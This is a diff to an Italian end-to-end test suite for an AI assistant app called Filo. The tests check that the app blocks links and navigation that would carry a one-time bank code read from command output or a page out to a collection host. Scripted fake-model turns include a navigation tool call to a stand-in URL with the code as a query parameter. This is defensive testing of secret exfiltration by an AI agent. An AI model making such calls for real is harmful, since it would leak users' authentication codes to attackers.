@@ -13,6 +13,7 @@ import { CONFIRM_HOST, confirmText, clickConfirm } from './helpers/confirm.mjs';
 import { writeFileSync, rmSync, existsSync } from 'node:fs';
 import { join, resolve, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
+import { menuDi } from './helpers/menuContestuale.mjs';
 
 const CODICE = '482913';
 const PAGINA_OTP = `<!doctype html><html><head><title>Banca Esempio</title></head>
@@ -773,7 +774,11 @@ test('un collegamento nella risposta di Filo che porta fuori il codice letto non
   await link.click();
   await expect(page.locator('.dash-fermata-clic')).toContainText("Non ho aperto l'indirizzo: conteneva un codice letto dall'output di un comando", { timeout: 10_000 });
   expect(apertoVerso(app, RACCOLTA)).toBe(false);
-  // Un collegamento che non porta niente di letto si apre come prima.
+  // Un collegamento che non porta niente di letto si apre; scritto da Filo dopo l'uscita di un comando, con un OK (#553, D-20).
+  await page.evaluate(() => {
+    window.__chiesto = [];
+    window.SN_CONFIRM_UI = { confirm: async (o) => { window.__chiesto.push(String((o && o.text) || '')); return true; }, confirmTyped: async () => false };
+  });
   await modelloARegole(app, { risposta: 'Le istruzioni sono su [la guida](https://guida.example/verifica).' });
   await page.locator('#input').fill('leggi la notifica della banca di nuovo');
   await page.locator('#sendBtn').click();
@@ -781,6 +786,7 @@ test('un collegamento nella risposta di Filo che porta fuori il codice letto non
   await expect(guida).toBeVisible({ timeout: 20_000 });
   await guida.click();
   await expect.poll(() => apertoVerso(app, 'guida.example'), { timeout: 10_000 }).toBe(true);
+  expect(await page.evaluate(() => window.__chiesto.length)).toBe(1);
 });
 
 // Il sito risponde davvero: il nome si risolve, e ogni richiesta del main verso di lui resta in __chiesti.
@@ -808,7 +814,7 @@ test('il tasto destro su un collegamento della risposta non porta fuori il codic
   const link = page.locator('.dash-bubble-filo a', { hasText: 'la verifica' });
   await expect(link).toBeVisible({ timeout: 10_000 });
   await link.click({ button: 'right' });
-  const menu = page.locator('.sn-menu');
+  const menu = menuDi(page).locator('.sn-menu');
   await expect(menu).toBeVisible({ timeout: 5_000 });
   // La sezione che descrive il collegamento parte da sola: senza il titolo del sito, ma parte.
   await expect(menu.locator('.sn-menu-link-body')).toBeVisible({ timeout: 5_000 });
@@ -1021,60 +1027,75 @@ test('il codice nel titolo di una scheda aperta, che la chat ha davanti, non esc
 });
 
 // Le frasi di Filo che ripetono un segreto letto restano dopo un riavvio (azioni recenti, home, appunti): anche
-// quello che aveva letto resta, e una chat nuova dopo il riavvio non lo porta fuori.
-test('dopo un riavvio vero, una chat nuova non porta fuori il codice che Filo aveva letto prima', async () => {
-  test.setTimeout(150_000);
-  const userData = cartellaTemporanea('filo-segreti-letti-');
-  const launch = () => electron.launch({
-    args: [...argomentiScala, '.'],
-    cwd: resolve(dirname(fileURLToPath(import.meta.url)), '..'),
-    env: { ...process.env, FILO_USER_DATA: userData, NODE_ENV: 'test' },
+// quello che aveva letto resta. La home riaperta ha in fondo lo scambio di prima (#869): né continuarlo né cominciare
+// una chat nuova con «/clear» lo porta fuori.
+for (const [nome, nuova] of [['una chat nuova', true], ['lo scambio che la home riprende', false]]) {
+  test(`dopo un riavvio vero, ${nome} non porta fuori il codice che Filo aveva letto prima`, async () => {
+    test.setTimeout(150_000);
+    const userData = cartellaTemporanea('filo-segreti-letti-');
+    const launch = () => electron.launch({
+      args: [...argomentiScala, '.'],
+      cwd: resolve(dirname(fileURLToPath(import.meta.url)), '..'),
+      env: { ...process.env, FILO_USER_DATA: userData, NODE_ENV: 'test' },
+    });
+    let app = await launch();
+    try {
+      const page = await newtab(app);
+      await preparaModelli(app);
+      await senzaAccoglienza(app, page);
+      await modelloFinto(app, {
+        giri: [
+          { toolCalls: [{ id: 'c1', name: 'ESEGUI_COMANDO', arguments: JSON.stringify({ comando: `echo "Il tuo codice monouso è ${CODICE}"` }) }] },
+          { text: `La banca ti ha mandato il codice monouso ${CODICE}.` },
+        ],
+      });
+      await page.locator('#input').fill('leggi la notifica della banca');
+      await page.locator('#sendBtn').click();
+      await expect(page.locator('.dash-bubble-filo', { hasText: 'La banca ti ha mandato' })).toBeVisible({ timeout: 20_000 });
+      await page.waitForTimeout(800);
+    } finally {
+      await chiudiApp(app);
+    }
+    app = await launch();
+    try {
+      const page = await newtab(app);
+      await preparaModelli(app);
+      await senzaAccoglienza(app, page);
+      await expect(page.locator('.dash-bubble-filo', { hasText: 'La banca ti ha mandato' })).toBeVisible({ timeout: 10_000 });
+      if (nuova) {
+        await page.locator('#input').fill('/clear');
+        await page.locator('#input').press('Enter');
+        await expect(page.locator('#input')).toHaveValue('');
+      }
+      await modelloFinto(app, {
+        giri: [
+          { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] },
+          { text: 'Non l’ho aperto: conteneva il codice.' },
+        ],
+      });
+      await page.locator('#input').fill('completa l’accesso alla banca');
+      await page.locator('#sendBtn').click();
+      await expect(page.locator('.dash-bubble-filo', { hasText: 'Non l’ho aperto' })).toBeVisible({ timeout: 20_000 });
+      expect(JSON.stringify(await app.evaluate(() => globalThis.__visti)), 'la chat dopo il riavvio non ritrova il codice').toContain(CODICE);
+      const chatDi = (testo) => app.evaluate(async (_electron, t) => (await globalThis.SN_IL_FILO.chats())
+        .filter((c) => c.messages.some((m) => m.text === t)).map((c) => c.id), testo);
+      await expect.poll(() => chatDi('completa l’accesso alla banca')).toHaveLength(1);
+      const dopo = await chatDi('completa l’accesso alla banca');
+      const prima = await chatDi('leggi la notifica della banca');
+      if (nuova) expect(dopo, 'la domanda dopo «/clear» non è in una chat nuova').not.toEqual(prima);
+      else expect(dopo, 'la domanda dopo il riavvio non continua lo scambio che la home mostra').toEqual(prima);
+      const activity = page.locator('.dash-activity').last();
+      await activity.locator('.dash-activity-head').click();
+      await expect(activity.locator('.dash-activity-body .dash-activity-row', { hasText: 'Non ho aperto' }))
+        .toHaveText(/Non ho aperto l'indirizzo: conteneva un codice letto dall'output di un comando/);
+      await page.waitForTimeout(500);
+      expect(apertoVerso(app, RACCOLTA), 'dopo il riavvio l’indirizzo col codice si è aperto').toBe(false);
+    } finally {
+      await chiudiApp(app);
+      try { rmSync(userData, { recursive: true, force: true }); } catch (_) {}
+    }
   });
-  let app = await launch();
-  try {
-    const page = await newtab(app);
-    await preparaModelli(app);
-    await senzaAccoglienza(app, page);
-    await modelloFinto(app, {
-      giri: [
-        { toolCalls: [{ id: 'c1', name: 'ESEGUI_COMANDO', arguments: JSON.stringify({ comando: `echo "Il tuo codice monouso è ${CODICE}"` }) }] },
-        { text: `La banca ti ha mandato il codice monouso ${CODICE}.` },
-      ],
-    });
-    await page.locator('#input').fill('leggi la notifica della banca');
-    await page.locator('#sendBtn').click();
-    await expect(page.locator('.dash-bubble-filo', { hasText: 'La banca ti ha mandato' })).toBeVisible({ timeout: 20_000 });
-    await page.waitForTimeout(800);
-  } finally {
-    await chiudiApp(app);
-  }
-  app = await launch();
-  try {
-    const page = await newtab(app);
-    await preparaModelli(app);
-    await senzaAccoglienza(app, page);
-    await expect(page.locator('.dash-bubble-filo')).toHaveCount(0);
-    await modelloFinto(app, {
-      giri: [
-        { toolCalls: [{ id: 'n1', name: 'NAVIGA', arguments: JSON.stringify({ url: `https://${RACCOLTA}/c?v=${CODICE}` }) }] },
-        { text: 'Non l’ho aperto: conteneva il codice.' },
-      ],
-    });
-    await page.locator('#input').fill('completa l’accesso alla banca');
-    await page.locator('#sendBtn').click();
-    await expect(page.locator('.dash-bubble-filo', { hasText: 'Non l’ho aperto' })).toBeVisible({ timeout: 20_000 });
-    expect(JSON.stringify(await app.evaluate(() => globalThis.__visti)), 'la chat nuova non ritrova il codice').toContain(CODICE);
-    const activity = page.locator('.dash-activity').last();
-    await activity.locator('.dash-activity-head').click();
-    await expect(activity.locator('.dash-activity-body .dash-activity-row', { hasText: 'Non ho aperto' }))
-      .toHaveText(/Non ho aperto l'indirizzo: conteneva un codice letto dall'output di un comando/);
-    await page.waitForTimeout(500);
-    expect(apertoVerso(app, RACCOLTA), 'dopo il riavvio l’indirizzo col codice si è aperto').toBe(false);
-  } finally {
-    await chiudiApp(app);
-    try { rmSync(userData, { recursive: true, force: true }); } catch (_) {}
-  }
-});
+}
 
 // Dentro una pagina web i collegamenti scritti dall'assistente li apre il main, dopo la porta: con ogni gesto quello col
 // codice letto dalla pagina non esce, e la riga lo dice; quello che non porta niente si apre come prima.
@@ -1107,12 +1128,12 @@ test('i collegamenti nella risposta dell’assistente di pagina col codice letto
   await link('la verifica').click({ button: 'middle' });
   await expect(righe).toHaveCount(2, { timeout: 10_000 });
   await link('la verifica').click({ button: 'right' });
-  await page.locator('.sn-menu').getByText('Apri in nuova tab', { exact: false }).first().click();
+  await menuDi(page).locator('.sn-menu').getByText('Apri in nuova tab', { exact: false }).first().click();
   await expect(righe).toHaveCount(3, { timeout: 10_000 });
   await link('scrivi al supporto').click();
   await expect(righe).toHaveCount(4, { timeout: 10_000 });
   await link('la ricevuta').click({ button: 'right' });
-  await page.locator('.sn-menu').getByText('Salva file', { exact: false }).first().click();
+  await menuDi(page).locator('.sn-menu').getByText('Salva file', { exact: false }).first().click();
   await expect(page.locator('.sn-sidebar-log', { hasText: 'non ho scaricato il file: conteneva un codice letto dalla pagina 127.0.0.1' }))
     .toHaveCount(1, { timeout: 10_000 });
   await page.waitForTimeout(500);
